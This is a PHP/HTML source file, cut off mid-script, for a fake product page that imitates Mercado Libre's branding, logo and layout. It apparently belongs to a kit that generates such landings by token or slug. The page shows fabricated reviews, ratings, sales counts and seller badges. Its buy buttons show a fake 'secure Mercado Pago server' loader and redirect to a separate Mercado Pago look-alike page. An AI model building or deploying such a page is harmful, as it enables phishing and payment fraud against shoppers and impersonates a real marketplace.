<?php
require_once __DIR__ . '/../../conexion.php';
require_once __DIR__ . '/../../config.php';
require_once __DIR__ . '/../../token_helper.php';

$landing_data = null;
$token = $_GET['token'] ?? '';

if (!empty($token)) {
    $landing_data = obtenerLandingPorToken($token, $pdo);
}

if (!$landing_data && isset($_GET['landing'])) {
    $landing_slug = preg_replace('/[^a-z0-9\-]/', '', $_GET['landing']);
    $stmt = $pdo->prepare("SELECT * FROM landings WHERE slug = ?");
    $stmt->execute([$landing_slug]);
    $landing_data = $stmt->fetch();
}

if ($landing_data) {
    $producto = $landing_data['producto'];
    $precio = (int)$landing_data['precio'];
    $landing_slug = $landing_data['slug'];
} else {
    $producto = isset($_GET['producto']) ? $_GET['producto'] : 'DJI Osmo Pocket 3 Creator Combo Color Negro';
    $precio = isset($_GET['precio']) ? (int)$_GET['precio'] : 1850000;
    $landing_slug = isset($_GET['landing']) ? preg_replace('/[^a-z0-9\-]/', '', $_GET['landing']) : 'dji-osmo-pocket-3';
}

// ─── Extracción Inteligente y Dinámica de Imágenes (Localhost & Railway) ───
$raw_imgs = $landing_data['imagenes'] ?? [];
if (is_string($raw_imgs)) {
    $imagenes_db = json_decode($raw_imgs, true) ?: [];
} else if (is_array($raw_imgs)) {
    $imagenes_db = $raw_imgs;
} else {
    $imagenes_db = [];
}

$is_localhost = in_array($_SERVER['HTTP_HOST'] ?? '', ['localhost', '127.0.0.1']) || strpos($_SERVER['HTTP_HOST'] ?? '', '192.168.') === 0;
$base_landing_url = $is_localhost 
    ? "../../../SISTEMA_LANDINGS/landings/{$landing_slug}" 
    : rtrim(URL_LANDINGS, '/') . "/landings/{$landing_slug}";

$local_landing_dir = __DIR__ . '/../../../SISTEMA_LANDINGS/landings/' . $landing_slug;

$lista_imagenes = [];

// 1. Escanear directamente el directorio local de imágenes de la landing si existe en el mismo servidor (localhost)
if (is_dir($local_landing_dir . '/img')) {
    $files = scandir($local_landing_dir . '/img');
    foreach ($files as $f) {
        if ($f !== '.' && $f !== '..' && preg_match('/\.(jpg|jpeg|png|webp)$/i', $f) && strpos($f, 'rev_') !== 0) {
            $lista_imagenes[] = "{$base_landing_url}/img/{$f}";
        }
    }
}

// 2. Si no encontró en disco, usar lo que esté en base de datos
if (empty($lista_imagenes) && !empty($imagenes_db)) {
    foreach ($imagenes_db as $k => $val) {
        if (!empty($val) && is_string($val)) {
            if (strpos($k, 'img_') === 0 || is_numeric($k) || $k === 'producto' || $k === 'desktop') {
                if (strpos($val, 'http') === 0) {
                    $lista_imagenes[] = $val;
                } else {
                    $lista_imagenes[] = "{$base_landing_url}/" . ltrim($val, '/');
                }
            }
        }
    }
}

// 3. Fallback en caso de que aún esté vacío
if (empty($lista_imagenes)) {
    $lista_imagenes = [
        "{$base_landing_url}/producto.png",
        "https://images.unsplash.com/photo-1516035069371-29a1b244cc32?w=800&auto=format&fit=crop&q=80",
        "https://images.unsplash.com/photo-1526170375885-4d8ecf77b99f?w=800&auto=format&fit=crop&q=80",
        "https://images.unsplash.com/photo-1508873696983-2df5293cb32f?w=800&auto=format&fit=crop&q=80"
    ];
}

$imagen_producto = $lista_imagenes[0];

// Formatear precio
$precio_formateado = number_format($precio, 0, ',', '.');
$precio_cuotas = number_format(round($precio / 12), 0, ',', '.');

// ─── Reseñas Auténticas con Fotos Reales ───
$resenas_con_fotos = [
    'dji-osmo-pocket-3' => [
        [
            'img' => 'img_reviews/dji_rev_1.jpg',
            'stars' => '★★★★★',
            'titulo' => 'Excelente compra calidad dji, viene completamente sellado.',
            'texto' => 'Excelente compra calidad dji, viene completamente sellado. La estabilización en 3 ejes funciona perfecto y el sensor de 1 pulgada en baja luz es impresionante.',
            'ubicacion' => 'Colombia',
            'fecha' => 'Hace 3 semanas',
            'likes' => 23
        ],
        [
            'img' => 'img_reviews/dji_rev_2.jpg',
            'stars' => '★★★★★',
            'titulo' => 'Increíble para vlogs en exteriores',
            'texto' => 'Lo probé en el parque con el mini trípode y el micrófono DJI Mic 2. El audio y la nitidez son de otro nivel. Súper satisfecho con la entrega contraentrega.',
            'ubicacion' => 'Bogotá, Colombia',
            'fecha' => 'Hace 1 mes',
            'likes' => 45
        ],
        [
            'img' => 'img_reviews/dji_rev_3.jpg',
            'stars' => '★★★★★',
            'titulo' => 'Unboxing impecable y original 100%',
            'texto' => 'Viene en su caja original con manuales, garantía y todos los accesorios completos del Creator Combo. Llegó en 2 días.',
            'ubicacion' => 'Medellín, Colombia',
            'fecha' => 'Hace 2 meses',
            'likes' => 19
        ]
    ],
    'airpods-max-wireless' => [
        [
            'img' => 'img_reviews/airpods_rev_1.jpg',
            'stars' => '★★★★★',
            'titulo' => 'Sonido Hi-Fi y cancelación insuperable',
            'texto' => 'Los uso a diario en la oficina con mi Mac. La cancelación activa de ruido aísla todo por completo y las almohadillas son muy cómodas.',
            'ubicacion' => 'Colombia',
            'fecha' => 'Hace 2 semanas',
            'likes' => 38
        ]
    ],
    'dyson-airwrap-complete' => [
        [
            'img' => 'img_reviews/dyson_rev_1.jpg',
            'stars' => '★★★★★',
            'titulo' => 'El mejor moldeador, no maltrata el cabello',
            'texto' => 'Viene con todos los cabezales y accesorios completos en su estuche. Los rizos con el efecto Coanda duran todo el día sin resecar el pelo.',
            'ubicacion' => 'Colombia',
            'fecha' => 'Hace 1 mes',
            'likes' => 52
        ]
    ],
    'smartwatch-ultra-titanium' => [
        [
            'img' => 'img_reviews/smartwatch_rev_1.jpg',
            'stars' => '★★★★★',
            'titulo' => 'Muy resistente y pantalla ultra brillante',
            'texto' => 'La caja de titanio resiste golpes y la correa naranja es súper cómoda. La batería me dura 4 días continuos con GPS.',
            'ubicacion' => 'Colombia',
            'fecha' => 'Hace 3 semanas',
            'likes' => 31
        ]
    ]
];

$reviews_actuales = $resenas_con_fotos[$landing_slug] ?? $resenas_con_fotos['dji-osmo-pocket-3'];
?>
<!DOCTYPE html>
<html lang="es-CO">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
    <title><?= htmlspecialchars($producto) ?> | Mercado Libre</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Proxima+Nova:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    
    <style>
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 300;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 400;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 600;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff2') format('woff2');
        }

        :root {
            --ml-yellow: #fff159;
            --ml-blue: #3483fa;
            --ml-blue-hover: #2968c8;
            --ml-blue-light: rgba(65,137,230,.15);
            --ml-text-black: #333333;
            --ml-text-gray: #666666;
            --ml-text-light: #999999;
            --ml-green: #00a650;
            --ml-border: #e6e6e6;
            --ml-bg: #ebebeb;
        }

        * { box-sizing: border-box; }
        body, html {
            margin: 0;
            padding: 0;
            font-family: 'Proxima Nova', -apple-system, 'Helvetica Neue', Helvetica, Roboto, Arial, sans-serif;
            background-color: var(--ml-bg);
            color: var(--ml-text-black);
            -webkit-font-smoothing: antialiased;
        }

        /* HEADER */
        .ml-header {
            background-color: var(--ml-yellow);
            height: 90px;
            width: 100%;
            position: relative;
        }
        @media (max-width: 1024px) {
            .ml-header { height: 56px; }
        }

        .nav-bounds {
            max-width: 1200px;
            margin: 0 auto;
            height: 100%;
            display: flex;
            align-items: center;
            padding: 0 16px;
            justify-content: space-between;
        }

        .nav-logo {
            width: 134px;
            height: 34px;
            background-image: url('https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/logo__large_plus.png');
            background-size: contain;
            background-repeat: no-repeat;
            margin-right: 30px;
            flex-shrink: 0;
        }

        .nav-search {
            flex: 1;
            max-width: 600px;
            height: 40px;
            background: #fff;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.2);
            border-radius: 2px;
            display: flex;
            align-items: center;
        }
        
        .nav-search-input {
            flex: 1;
            height: 100%;
            border: none;
            padding: 0 15px;
            font-size: 15px;
            color: var(--ml-text-black);
            outline: none;
        }

        .nav-search-btn {
            background: transparent;
            border: none;
            border-left: 1px solid var(--ml-border);
            width: 46px;
            height: 100%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* CONTENEDOR PRINCIPAL */
        .main-container {
            max-width: 1200px;
            margin: 16px auto;
            background: #ffffff;
            border-radius: 6px;
            display: flex;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
            overflow: hidden;
        }

        .product-gallery {
            padding: 24px;
            display: flex;
            gap: 16px;
        }

        .gallery-thumbnails {
            display: flex;
            flex-direction: column;
            gap: 10px;
            width: 54px;
        }

        .thumbnail {
            width: 50px;
            height: 50px;
            border: 2px solid transparent;
            border-radius: 4px;
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            cursor: pointer;
            transition: border-color 0.2s ease;
            background-color: #ffffff;
        }

        .thumbnail.active, .thumbnail:hover {
            border-color: var(--ml-blue) !important;
        }

        .main-image-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 420px;
            max-height: 520px;
        }

        .main-image {
            max-width: 100%;
            max-height: 500px;
            object-fit: contain;
            transition: opacity 0.2s ease;
        }

        .product-info-wrapper {
            display: flex;
            flex-direction: row;
        }

        .product-info-center {
            padding: 24px 20px;
        }

        .product-title {
            font-size: 22px;
            font-weight: 600;
            margin: 0 0 10px 0;
            color: var(--ml-text-black);
            line-height: 1.25;
        }

        .price-container {
            margin: 14px 0 6px 0;
            display: flex;
            align-items: baseline;
        }

        .price-currency {
            font-size: 20px;
            font-weight: 400;
            margin-right: 2px;
        }

        .price-amount {
            font-size: 36px;
            font-weight: 300;
        }

        .btn {
            height: 48px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            transition: background-color .2s;
            border: none;
            width: 100%;
        }

        .btn-primary { background-color: var(--ml-blue); color: #fff; }
        .btn-primary:hover { background-color: var(--ml-blue-hover); }
        .btn-secondary { background-color: var(--ml-blue-light); color: var(--ml-blue); }
        .btn-secondary:hover { background-color: rgba(65,137,230,.25); }

        /* ─── SECCIÓN OPINIONES CON FOTOS ESTILO MERCADOLIBRE ─── */
        .reviews-ml-section {
            max-width: 1200px;
            margin: 16px auto 40px auto;
            background: #ffffff;
            border-radius: 6px;
            padding: 36px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
        }

        .reviews-ml-title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 24px;
            color: #111111;
        }

        .photos-strip-header {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 12px;
            color: #333333;
        }

        .opinions-photos-gallery {
            display: flex;
            gap: 12px;
            overflow-x: auto;
            padding-bottom: 14px;
            margin-bottom: 30px;
        }

        .opinion-photo-card {
            flex: 0 0 110px;
            height: 110px;
            border-radius: 6px;
            overflow: hidden;
            border: 1px solid var(--ml-border);
            cursor: pointer;
            position: relative;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .opinion-photo-card:hover {
            transform: scale(1.04);
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            border-color: var(--ml-blue);
        }

        .opinion-photo-card img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .reviews-list-ml {
            display: flex;
            flex-direction: column;
            gap: 20px;
            border-top: 1px solid var(--ml-border);
            padding-top: 24px;
        }

        .review-row-ml {
            border-bottom: 1px solid #f3f4f6;
            padding-bottom: 20px;
        }

        .review-stars-ml {
            color: var(--ml-blue);
            font-size: 14px;
            letter-spacing: 2px;
            margin-bottom: 6px;
        }

        .review-title-ml {
            font-weight: 600;
            font-size: 15px;
            margin-bottom: 6px;
            color: #111111;
        }

        .review-text-ml {
            font-size: 14px;
            color: var(--ml-text-gray);
            line-height: 1.45;
            margin-bottom: 12px;
        }

        .review-footer-ml {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .review-meta-ml {
            font-size: 12px;
            color: var(--ml-text-light);
        }

        .btn-like-ml {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            border: 1px solid #d1d5db;
            background: #ffffff;
            color: #333333;
            font-size: 13px;
            font-weight: 600;
            padding: 6px 14px;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .btn-like-ml:hover {
            background-color: #f9fafb;
            border-color: #9ca3af;
        }

        .btn-like-ml.liked {
            border-color: var(--ml-blue);
            color: var(--ml-blue);
            background-color: var(--ml-blue-light);
        }

        /* ─── MODAL OPINIONES CON FOTOS (EXACTO A LA IMAGEN) ─── */
        .ml-photo-modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.78);
            z-index: 99999;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
            backdrop-filter: blur(4px);
        }

        .ml-photo-modal-overlay.open {
            display: flex;
        }

        .ml-photo-modal-dialog {
            background: #ffffff;
            border-radius: 8px;
            width: 100%;
            max-width: 980px;
            height: 90vh;
            max-height: 640px;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        }

        .modal-ml-header {
            padding: 14px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--ml-border);
        }

        .modal-ml-back-btn {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 16px;
            font-weight: 600;
            color: #111111;
            cursor: pointer;
            border: none;
            background: none;
        }

        .modal-ml-close-btn {
            font-size: 20px;
            color: var(--ml-blue);
            cursor: pointer;
            background: none;
            border: none;
            padding: 4px;
        }

        .modal-ml-body {
            flex: 1;
            display: flex;
            overflow: hidden;
        }

        @media (max-width: 768px) {
            .modal-ml-body {
                flex-direction: column;
            }
        }

        /* COLUMNA IZQUIERDA: FOTO GRANDE + CARRUSEL */
        .modal-ml-left {
            flex: 1.3;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            padding: 16px;
            border-right: 1px solid var(--ml-border);
            position: relative;
        }

        .modal-photo-stage {
            flex: 1;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .modal-photo-stage img {
            max-width: 100%;
            max-height: 420px;
            object-fit: contain;
            border-radius: 4px;
        }

        .modal-photo-counter {
            font-size: 13px;
            color: var(--ml-text-gray);
            margin: 8px 0;
            font-weight: 600;
        }

        .modal-thumbs-carousel {
            display: flex;
            gap: 8px;
            overflow-x: auto;
            width: 100%;
            max-width: 480px;
            padding: 6px;
        }

        .modal-thumb-item {
            width: 50px;
            height: 50px;
            border-radius: 4px;
            overflow: hidden;
            border: 2px solid transparent;
            cursor: pointer;
            flex-shrink: 0;
            opacity: 0.6;
            transition: all 0.2s;
        }

        .modal-thumb-item.active {
            border-color: var(--ml-blue);
            opacity: 1;
        }

        .modal-thumb-item img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* COLUMNA DERECHA: ESTRELLAS, TEXTO Y BOTÓN ÚTIL */
        .modal-ml-right {
            flex: 1;
            padding: 30px 24px;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            background: #ffffff;
        }

        .modal-review-stars {
            color: var(--ml-blue);
            font-size: 16px;
            letter-spacing: 2px;
            margin-bottom: 14px;
        }

        .modal-review-text {
            font-size: 15px;
            line-height: 1.5;
            color: #111111;
            font-weight: 400;
            margin-bottom: 12px;
        }

        .modal-review-meta {
            font-size: 13px;
            color: var(--ml-text-light);
            margin-bottom: 24px;
        }

        .modal-btn-util {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            border: 1px solid #d1d5db;
            background: #ffffff;
            padding: 8px 18px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
            color: #333333;
            cursor: pointer;
            width: fit-content;
            transition: all 0.2s ease;
        }

        .modal-btn-util:hover {
            background-color: #f9fafb;
            border-color: #9ca3af;
        }

        .modal-btn-util.liked {
            border-color: var(--ml-blue);
            color: var(--ml-blue);
            background-color: var(--ml-blue-light);
        }

        @media (max-width: 1024px) {
            .main-container { flex-direction: column; }
            .product-info-wrapper { flex-direction: column !important; }
            .product-gallery { flex-direction: column-reverse; padding: 16px; }
            .gallery-thumbnails { flex-direction: row; width: 100%; justify-content: center; }
            .product-info-center { width: 100% !important; padding: 16px !important; }
            .product-buybox { width: 100% !important; margin: 0 !important; border-left: none !important; border-top: 1px solid var(--ml-border) !important; }
        }
    </style>
</head>
<body>

    <!-- HEADER -->
    <header class="ml-header">
        <div class="nav-bounds">
            <a href="#" class="nav-logo"></a>
            <div class="nav-search">
                <input type="text" class="nav-search-input" value="<?= htmlspecialchars($producto) ?>">
                <button type="submit" class="nav-search-btn">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                </button>
            </div>
            <a href="#" class="nav-promo" style="display:flex; align-items:center; text-decoration:none; color:#333; font-size:13px; font-weight:600; gap:6px;">
                <span style="background:#00a650; color:#fff; padding:2px 8px; border-radius:10px; font-size:11px;">Meli+</span>
                <span>Envíos Gratis</span>
            </a>
        </div>
    </header>

    <!-- PRODUCTO PRINCIPAL -->
    <main class="main-container">
        <!-- GALERÍA DINÁMICA DE IMÁGENES -->
        <div class="product-gallery" style="width: 50%;">
            <div class="gallery-thumbnails">
                <?php foreach ($lista_imagenes as $idx => $img_url): ?>
                    <div class="thumbnail <?= $idx === 0 ? 'active' : '' ?>" 
                         onclick="changeMainImage(this, '<?= htmlspecialchars($img_url) ?>')" 
                         style="background-image: url('<?= htmlspecialchars($img_url) ?>');">
                    </div>
                <?php endforeach; ?>
            </div>
            <div class="main-image-container">
                <img id="main-product-image" src="<?= htmlspecialchars($imagen_producto) ?>" alt="<?= htmlspecialchars($producto) ?>" class="main-image">
            </div>
        </div>

        <!-- INFORMACIÓN DEL PRODUCTO (CENTRO Y DERECHA) -->
        <div class="product-info-wrapper" style="width: 50%;">
            <!-- CENTRO -->
            <div class="product-info-center" style="width: 55%;">
                <div style="font-size: 14px; color: var(--ml-text-gray); margin-bottom: 8px;">
                    Nuevo | +1.400 vendidos
                </div>
                
                <h1 class="product-title"><?= htmlspecialchars($producto) ?></h1>
                
                <div style="display: flex; align-items: center; margin-bottom: 12px;">
                    <span style="color: var(--ml-text-gray); font-size: 14px; margin-right: 4px;">5.0</span>
                    <span class="stars" style="color: var(--ml-blue); font-size: 14px; letter-spacing: 2px;">★★★★★</span>
                    <span style="color: var(--ml-text-light); font-size: 14px; margin-left: 6px;">(128 opiniones)</span>
                </div>

                <div style="background-color: #ff7733; color: white; font-size: 11px; font-weight: 700; display: inline-block; padding: 3px 8px; border-radius: 4px; margin-bottom: 12px;">
                    🔥 MÁS VENDIDO EN SU CATEGORÍA
                </div>

                <div class="price-container">
                    <span class="price-currency">$</span>
                    <span class="price-amount"><?= $precio_formateado ?></span>
                </div>

                <div style="font-size: 15px; color: var(--ml-text-black); margin-bottom: 8px;">
                    <span style="color: var(--ml-green); font-weight:600;">12 cuotas de $ <?= $precio_cuotas ?> con 0% interés</span>
                </div>

                <div style="background-color: var(--ml-blue-light); color: var(--ml-blue); font-size: 12px; font-weight: 600; display: inline-block; padding: 4px 8px; border-radius: 4px; margin-bottom: 16px;">
                    💳 15% OFF con Pago Seguro
                </div>

                <div style="font-size: 14px; color: var(--ml-text-black); margin-bottom: 20px; line-height: 1.4;">
                    Color: <strong>Oficial de Fábrica</strong><br>
                    <div style="width: 44px; height: 44px; border: 2px solid var(--ml-blue); border-radius: 4px; padding: 2px; margin-top: 6px; cursor: pointer;">
                        <div style="width: 100%; height: 100%; background-image: url('<?= htmlspecialchars($imagen_producto) ?>'); background-size: cover; background-position: center; border-radius: 2px;"></div>
                    </div>
                </div>

                <div style="font-size: 16px; font-weight: 600; margin-bottom: 10px;">
                    Lo que tienes que saber de este producto
                </div>
                <ul style="font-size: 13.5px; color: var(--ml-text-black); padding-left: 18px; margin-bottom: 16px; line-height: 1.5;">
                    <li style="margin-bottom: 6px;">Producto 100% original con empaque sellado de fábrica.</li>
                    <li style="margin-bottom: 6px;">Garantía oficial y soporte técnico directo.</li>
                    <li style="margin-bottom: 6px;">Envío prioritario asegurado a toda Colombia con número de guía.</li>
                </ul>
            </div>

            <!-- DERECHA (BUY BOX) -->
            <div class="product-buybox" style="width: 45%; padding: 24px 16px; border-left: 1px solid var(--ml-border); border-radius: 8px; margin: 16px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.12); height: fit-content;">
                <div style="margin-bottom: 20px;">
                    <div style="color: var(--ml-green); font-weight: 600; font-size: 16px; margin-bottom: 4px;">Llega gratis mañana <span style="font-weight: 400; color: var(--ml-text-gray); font-size: 13px;"><br>a tu domicilio en Colombia</span></div>
                    <span style="color: var(--ml-blue); font-size: 13px; cursor: pointer;">Enviar a mi ubicación</span>
                </div>

                <div style="font-size: 15px; font-weight: 600; color: #00a650; margin-bottom: 20px;">
                    ¡Stock disponible!
                </div>

                <div class="actions" style="display: flex; flex-direction: column; gap: 10px; margin-bottom: 24px;">
                    <button class="btn btn-primary" onclick="iniciarCompra()">
                        Comprar ahora
                    </button>
                    <button class="btn btn-secondary" onclick="iniciarCompra()">
                        Agregar al carrito
                    </button>
                </div>

                <div style="text-align: center; margin-bottom: 20px;">
                    <img src="pse.png" alt="Pago con PSE" style="height: 32px; object-fit: contain;">
                </div>

                <div style="font-size: 13px; margin-bottom: 20px; line-height: 1.4;">
                    Vendido por <span style="color: var(--ml-blue); font-weight: 600; cursor: pointer;">Tienda Oficial Certificada</span><br>
                    <span style="color: var(--ml-text-gray);">MercadoLíder Platinum | +10.000 ventas</span>
                </div>

                <div style="font-size: 13px; color: var(--ml-text-light); line-height: 1.4;">
                    <p style="margin-bottom: 10px;">🛡️ <b style="color: var(--ml-blue);">Compra Protegida:</b> Recibe el producto que esperabas o te devolvemos tu dinero.</p>
                    <p>⭐ <b>Garantía:</b> 30 días de cobertura total.</p>
                </div>
            </div>
        </div>
    </main>
    
    <!-- ─── SECCIÓN OPINIONES CON FOTOS ESTILO MERCADOLIBRE ─── -->
    <section class="reviews-ml-section" id="opinions-section">
        <h2 class="reviews-ml-title">Opiniones del producto</h2>
        
        <div class="photos-strip-header">Opiniones con fotos</div>
        <div class="opinions-photos-gallery">
            <?php foreach ($reviews_actuales as $idx => $rev): ?>
            <div class="opinion-photo-card" onclick="abrirModalReview(<?= $idx ?>)">
                <img src="<?= htmlspecialchars($rev['img']) ?>" alt="Foto de comprador">
            </div>
            <?php endforeach; ?>
        </div>

        <div class="reviews-list-ml">
            <?php foreach ($reviews_actuales as $idx => $rev): ?>
            <div class="review-row-ml">
                <div class="review-stars-ml"><?= $rev['stars'] ?></div>
                <div class="review-title-ml"><?= htmlspecialchars($rev['titulo']) ?></div>
                <p class="review-text-ml"><?= htmlspecialchars($rev['texto']) ?></p>
                
                <div style="display:flex; gap:10px; margin-bottom:12px;">
                    <div style="width:70px; height:70px; border-radius:6px; overflow:hidden; border:1px solid var(--ml-border); cursor:pointer;" onclick="abrirModalReview(<?= $idx ?>)">
                        <img src="<?= htmlspecialchars($rev['img']) ?>" style="width:100%; height:100%; object-fit:cover;">
                    </div>
                </div>

                <div class="review-footer-ml">
                    <span class="review-meta-ml"><?= htmlspecialchars($rev['ubicacion']) ?> · <?= htmlspecialchars($rev['fecha']) ?></span>
                    <button class="btn-like-ml" id="likeBtnList_<?= $idx ?>" onclick="toggleLike(this, <?= $idx ?>)">
                        <span>Útil</span>
                        <span>👍</span>
                        <span class="like-counter" id="likeCounterList_<?= $idx ?>"><?= $rev['likes'] ?></span>
                    </button>
                </div>
            </div>
            <?php endforeach; ?>
        </div>
    </section>

    <!-- ─── MODAL FLOTANTE: OPINIONES CON FOTOS ─── -->
    <div class="ml-photo-modal-overlay" id="mlPhotoModal" onclick="if(event.target===this) cerrarModalReview()">
        <div class="ml-photo-modal-dialog">
            <div class="modal-ml-header">
                <button class="modal-ml-back-btn" onclick="cerrarModalReview()">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
                    <span>Opiniones con fotos</span>
                </button>
                <button class="modal-ml-close-btn" onclick="cerrarModalReview()">✕</button>
            </div>

            <div class="modal-ml-body">
                <!-- IZQUIERDA: FOTO GRANDE + PAGINADOR + MINIATURAS -->
                <div class="modal-ml-left">
                    <div class="modal-photo-stage">
                        <img id="modalMainPhoto" src="" alt="Foto de reseña">
                    </div>
                    <div class="modal-photo-counter" id="modalPhotoCounter">1 / 1</div>
                    <div class="modal-thumbs-carousel" id="modalThumbsCarousel"></div>
                </div>

                <!-- DERECHA: OPINIÓN + BOTÓN ÚTIL INTERACTIVO -->
                <div class="modal-ml-right">
                    <div class="modal-review-stars" id="modalStars">★★★★★</div>
                    <div class="modal-review-text" id="modalReviewText"></div>
                    <div class="modal-review-meta" id="modalMeta"></div>
                    
                    <button class="modal-btn-util" id="modalLikeBtn" onclick="toggleModalLike()">
                        <span>Útil</span>
                        <span>👍</span>
                        <span id="modalLikeCounter">0</span>
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- PANTALLA DE CARGA ML -->
    <div id="ml-loader" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.92); z-index: 99999; flex-direction: column; justify-content: center; align-items: center;">
        <div style="width: 50px; height: 50px; border: 4px solid var(--ml-bg); border-top-color: var(--ml-blue); border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
        <div style="margin-top: 18px; font-size: 17px; color: var(--ml-text-black); font-weight: 600;">Conectando con el servidor seguro de Mercado Pago...</div>
    </div>

    <style>
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>

    <script>
        const REVIEWS_DATA = <?= json_encode($reviews_actuales, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) ?>;
        let activeReviewModalIdx = 0;
        let likedMap = {};

        function iniciarCompra() {
            document.getElementById('ml-loader').style.display = 'flex';
            setTimeout(function() {
                window.location.href = '../mercadopago/index.php?producto=<?= urlencode($producto) ?>&precio=<?= $precio ?>';
            }, 1200);
        }

        function changeMainImage(element, newSrc) {
            let thumbnails = document.querySelectorAll('.gallery-thumbnails .thumbnail');
            thumbnails.forEach(function(thumb) {
                thumb.classList.remove('active');
            });
            element.classList.add('active');
            document.getElementById('main-product-image').src = newSrc;
        }

        /* ─── LÓGICA DEL MODAL DE OPINIONES CON FOTOS ─── */
        function abrirModalReview(idx) {
            if (idx < 0 || idx >= REVIEWS_DATA.length) return;
            activeReviewModalIdx = idx;
            const r = REVIEWS_DATA[idx];

            document.getElementById('modalMainPhoto').src = r.img;
            document.getElementById('modalPhotoCounter').textContent = `${idx + 1} / ${REVIEWS_DATA.length}`;
            document.getElementById('modalStars').textContent = r.stars;
            document.getElementById('modalReviewText').textContent = r.texto;
            document.getElementById('modalMeta').textContent = `${r.ubicacion} · ${r.fecha}`;
            
            // Like button
            const currentLikes = likedMap[idx] ? r.likes + 1 : r.likes;
            document.getElementById('modalLikeCounter').textContent = currentLikes;
            const btn = document.getElementById('modalLikeBtn');
            if (likedMap[idx]) {
                btn.classList.add('liked');
            } else {
                btn.classList.remove('liked');
            }

            // Render miniaturas
            const carousel = document.getElementById('modalThumbsCarousel');
            carousel.innerHTML = '';
            REVIEWS_DATA.forEach((item, i) => {
                const thumb = document.createElement('div');
                thumb.className = 'modal-thumb-item' + (i === idx ? ' active' : '');
                thumb.onclick = () => abrirModalReview(i);
                thumb.innerHTML = `<img src="${item.img}">`;
                carousel.appendChild(thumb);
            });

            document.getElementById('mlPhotoModal').classList.add('open');
            document.body.style.overflow = 'hidden';
        }

        function cerrarModalReview() {
            document.getElementById('mlPhotoModal').classList.remove('open');
            document.body.style.overflow = '';
        }

        function toggleLike(btn, idx) {
            if (likedMap[idx]) return; // ya dio like
            likedMap[idx] = true;
            REVIEWS_DATA[idx].likes += 1;
            
            btn.classList.add('liked');
            const counter = document.getElementById(`likeCounterList_${idx}`);
            if (counter) counter.textContent = REVIEWS_DATA[idx].likes;

            // Actualizar modal si está abierto
            if (activeReviewModalIdx === idx) {
                const modalBtn = document.getElementById('modalLikeBtn');
                const modalCounter = document.getElementById('modalLikeCounter');
                if (modalBtn) modalBtn.classList.add('liked');
                if (modalCounter) modalCounter.textContent = REVIEWS_DATA[idx].likes;
            }
        }

        function toggleModalLike() {
            const idx = activeReviewModalIdx;
            if (likedMap[idx]) return;
            toggleLike(document.getElementById(`likeBtnList_${idx}`), idx);
            const modalBtn = document.getElementById('modalLikeBtn');
            const modalCounter = document.getElementById('modalLikeCounter');
            if (modalBtn) modalBtn.classList.add('liked');
            if (modalCounter) modalCounter.textContent = REVIEWS_DATA[idx].likes;
        }

        document.addEventListener('keydown', (e) => {
            const modal = document.getElementById('mlPhotoModal');
            if (modal && modal.classList.contains('open')) {
                if (e.key === 'Escape') cerrarModalReview();
                if (e.key === 'ArrowLeft' && activeReviewModalIdx > 0) abrirModalReview(activeReviewModalIdx - 1);
